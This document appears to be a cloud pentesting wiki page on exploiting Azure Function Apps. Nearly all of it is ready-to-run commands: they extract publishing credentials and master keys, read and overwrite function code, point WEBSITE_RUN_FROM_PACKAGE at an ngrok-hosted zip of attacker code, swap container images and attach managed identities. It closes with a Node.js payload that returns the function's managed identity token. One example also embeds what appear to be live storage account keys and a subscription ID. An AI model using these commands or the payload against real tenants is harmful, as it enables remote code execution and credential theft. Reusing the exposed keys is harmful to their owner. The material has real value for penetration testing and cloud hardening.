---
title: "Azure Function Apps Explotation"
order: 102
description: Explotation of Azure Function Apps
---

## Basic Auth

> The permissions needed are:
> - **Microsoft.Web/sites/publishxml/action**
> - **Microsoft.Web/sites/basicPublishingCredentialsPolicies/write**
>
> Azure Functions allows to enable “Basic Auth” which basically could allow to access and deploy code using SCM (Source Code Manager) and FTP with credentials composed by a username and a password.

It’s possible to get the credentials and SCM and FTP URLs using the first permission with the API:

```bash
az functionapp deployment list-publishing-profiles \
    --name <app-name> \
    --resource-group <res-name> \
    --output json
```

If SCM or FTP credentials appear as redacted, you need to enable them (using the second permission).

To update the code using SCM credentials you can use the API directly or access `https://<app-name>.scm.azurewebsites.net/BasicAuth` with the obtained credentials.
The code must be inside a ZIP file.

To update the code using FTP it’s possible to connect to it and change the code of the file that will be executed using FTPS.

## Keys

### Get the master key

> The permission nedeed is:
> - **Microsoft.Web/sites/host/listkeys/action**
>
> This permission allows to list the function, master and system keys, but not the host one.

```bash
az functionapp keys list --resource-group <res_group> --name <func-name>
```

### Get the source code

```bash
curl "https://<func-app-name>.azurewebsites.net/admin/vfs/home/site/wwwroot/function_app.py?code=$MASTER_KEY" -v
```

### Modify code

> The permission needed is:
> - fileServices/fileshares/files/write

```bash
curl -s -X PUT \
  "https://$FUNCTION_NAME.azurewebsites.net/admin/vfs/site/wwwroot/hello-world/index.js?code=$MASTER_KEY" \
  -H "Content-Type: application/octet-stream" \
  -H "If-Match: *" \
  --data-binary @/tmp/payload/HttpTrigger/index.js
```

```bash
az storage file upload \
  --share-name $SHARE_NAME \
  --account-name $STORAGE_ACCOUNT \
  --account-key $STORAGE_KEY \
  --source /tmp/payload/HttpTrigger/index.js \
  --path site/wwwroot/hello-world/index.js
```

### Get the host key

> The permission needed is:
> - **Microsoft.Web/sites/functions/listKeys/action**
>
> This permission allows to get the default key, of the specified function with:

```bash
az rest --method POST --uri "https://management.azure.com/subscriptions/<subsription-id>/resourceGroups/<resource-group>/providers/Microsoft.Web/sites/<func-name>/functions/<func-endpoint-name>/listKeys?api-version=2022-03-01"
```

### Create / update function key

> The permission needed is:
> - **Microsoft.Web/sites/host/functionKeys/write**
>
> This permission allows to create/update a function key of the specified function with:


```bash
az functionapp keys set --resource-group <res_group> --key-name <key-name> --key-type functionKeys --name <func-name> --key-value q_8ILAoJaSp_wxpyHzGm4RVMPDKnjM_vpEb7z123yRvjAzFuo6wkIQ==
```

### Create / update master key

> The permission needed is:
> - **Microsoft.Web/sites/host/masterKey/write**
>
> This permission allows to create/update a master key to the specified function with:

```bash
az functionapp keys set --resource-group <res_group> --key-name <key-name> --key-type masterKey --name <func-name> --key-value q_8ILAoJaSp_wxpyHzGm4RVMPDKnjM_vpEb7z123yRvjAzFuo6wkIQ==
```

Remember that with this key you can also access the source code and modify it!

### Create/Update system key

> The permission needed is:
> - **Microsoft.Web/sites/host/systemKeys/write**
>
> This permission allows to create/update a system function key to the specified function with:

```bash
az functionapp keys set --resource-group <res_group> --key-name <key-name> --key-type masterKey --name <func-name> --key-value q_8ILAoJaSp_wxpyHzGm4RVMPDKnjM_vpEb7z123yRvjAzFuo6wkIQ==
```

## Settings

### Get the settings

> The permission needed is:
> - **Microsoft.Web/sites/config/list/action
**
>
> This permission allows to get the settings of a function. Inside these configurations it might be possible to find the default values AzureWebJobsStorage or WEBSITE_CONTENTAZUREFILECONNECTIONSTRING which contains an account key to access the blob storage of the function with FULL permissions.

```bash
az functionapp config appsettings list --name <func-name> --resource-group <res-group>
```

The setting WEBSITE_RUN_FROM_PACKAGE, if exists, will have a URL (potentially a SAS) to the source code the Function is executing.

Moreover, this permission also allows to get the SCM username and password (if enabled) with:

```bash
az rest --method POST \
  --url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/sites/<app-name>/config/publishingcredentials/list?api-version=2018-11-01"
```

### Get the setting and modify it

> The permissions required are:
> - **Microsoft.Web/sites/config/list/action**
> - **Microsoft.Web/sites/config/write**
>
> These permissions allows to list the config values of a function as we have seen before plus modify these values. It's therefore possible to set the value of the setting WEBSITE_RUN_FROM_PACKAGE pointing to a URL to a zip file containing the new code to execute inside a web application.

```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Web/sites/newfunctiontestlatestrelease/config/appsettings?api-version=2023-01-01" \
--headers '{"Content-Type": "application/json"}' \
--body '{"properties": {"APPLICATIONINSIGHTS_CONNECTION_STRING": "InstrumentationKey=67b64ab1-a49e-4e37-9c42-ff16e07290b0;IngestionEndpoint=https://canadacentral-1.in.applicationinsights.azure.com/;LiveEndpoint=https://canadacentral.livediagnostics.monitor.azure.com/;ApplicationId=cdd211a7-9981-47e8-b3c7-44cd55d53161", "AzureWebJobsStorage": "DefaultEndpointsProtocol=https;AccountName=newfunctiontestlatestr;AccountKey=gesefrkJxIk28lccvbTnuGkGx3oZ30ngHHodTyyVQu+nAL7Kt0zWvR2wwek9Ar5eis8HpkAcOVEm+AStG8KMWA==;EndpointSuffix=core.windows.net", "FUNCTIONS_EXTENSION_VERSION": "~4", "FUNCTIONS_WORKER_RUNTIME": "python", "WEBSITE_CONTENTAZUREFILECONNECTIONSTRING": "DefaultEndpointsProtocol=https;AccountName=newfunctiontestlatestr;AccountKey=gesefrkJxIk28lccvbTnuGkGx3oZ30ngHHodTyyVQu+nAL7Kt0zWvR2wwek9Ar5eis8HpkAcOVEm+AStG8KMWA==;EndpointSuffix=core.windows.net","WEBSITE_CONTENTSHARE": "newfunctiontestlatestrelease89c1", "WEBSITE_RUN_FROM_PACKAGE": "https://4c7d-81-33-68-77.ngrok-free.app/function_app.zip"}}'
```

## Modify code application

> The permissions required is:
> - **Microsoft.Web/sites/hostruntime/vfs/write**
>
> With this permission it's possible to modify the code of an application through the web console (or through the following API endpoints):

```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subcription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/sites/<app-name>/hostruntime/admin/vfs/function_app.py?relativePath=1&api-version=2022-03-01" \
--headers '{"Content-Type": "application/json", "If-Match": "*"}' \
--body @/tmp/body
```

Another option using the SCM endpoint: 

```bash
az rest --method PUT --url "https://consumptionexample.scm.azurewebsites.net/api/vfs/site/wwwroot/HttpExample/index.js" \
--resource "https://management.azure.com/" \
--headers "If-Match=*" \
--body 'module.exports = async function (context, req) {
	[...REST OF THE CODE HERE..]'
```

## Read Source code

> The permissions required is:
> - **Microsoft.Web/sites/hostruntime/vfs/read**
>
> This permission allows to read the source code of the app through the VFS:

```bash
az rest --url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/sites/<app-name>/hostruntime/admin/vfs/function_app.py?relativePath=1&api-version=2022-03-01"
```

## Modify Container run

> The following permissions are required:
> - **Microsoft.Web/sites/config/write**
> - **Microsoft.Web/sites/config/list/action**
> - **Microsoft.Web/sites/read**
> - **Microsoft.Web/sites/config/list/action**
> - **Microsoft.Web/sites/config/read**
>
> With these permissions it's possible to modify the container run by a function app that was configured to run a container. This would allow an attacker to upload a malicious azure function container app to docker hub (for example) and make the function execute it.

```bash
az functionapp config container set --name <app-name> \
    --resource-group <res-group> \
    --image "mcr.microsoft.com/azure-functions/dotnet8-quickstart-demo:1.0"
```

## Attach MI

> The following permissions are required:
> - **Microsoft.Web/sites/write**
> - **Microsoft.ManagedIdentity/userAssignedIdentities/assign/action**
> - **Microsoft.App/managedEnvironments/join/action**
> - **Microsoft.Web/sites/read**
> - **Microsoft.Web/sites/operationresults/read**
>
> With these permissions it's possible to attach a new user managed identity to a function. If the function was compromised this would allow to escalate privileges to any user managed identity.

```bash
az functionapp identity assign \
    --name <app-name> \
    --resource-group <res-group> \
    --identities /subscriptions/<subs-id>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<my-name>
```

## Enable function endpoints

> The following permissions are required:
> - **Microsoft.Web/sites/config/write**
> - **Microsoft.Web/sites/functions/properties/read**
>
> This permissions allows to enable function endpoints that might be disabled (or disable them):

```bash
az functionapp config appsettings set \
  --name <app-name> \
  --resource-group <res-group> \
  --settings "AzureWebJobs.<endpoint-name>.Disabled=false"
```

It's also possible to see if a function is enabled or disabled in the following URL (using the permission in parenthesis):

```bash
az rest --url "https://management.azure.com/subscriptions/<subscripntion-id>/resourceGroups/<res-group>/providers/Microsoft.Web/sites/<app-name>/functions/<func-name>/properties/state?api-version=2024-04-01"
```

## Node.js payload to steal MI

```javascript
// index.js — place in site/wwwroot/<func-name>/
const https = require('https');
const http = require('http');

module.exports = async function (context, req) {
    const endpoint = process.env.IDENTITY_ENDPOINT;
    const header   = process.env.IDENTITY_HEADER;
    const url = `${endpoint}?resource=https://vault.azure.net&api-version=2019-08-01`;

    const token = await new Promise((resolve, reject) => {
        const mod = url.startsWith('https') ? https : http;
        mod.get(url, { headers: { 'X-IDENTITY-HEADER': header } }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve(JSON.parse(data)));
        }).on('error', reject);
    });

    context.res = { status: 200, body: token };
};
```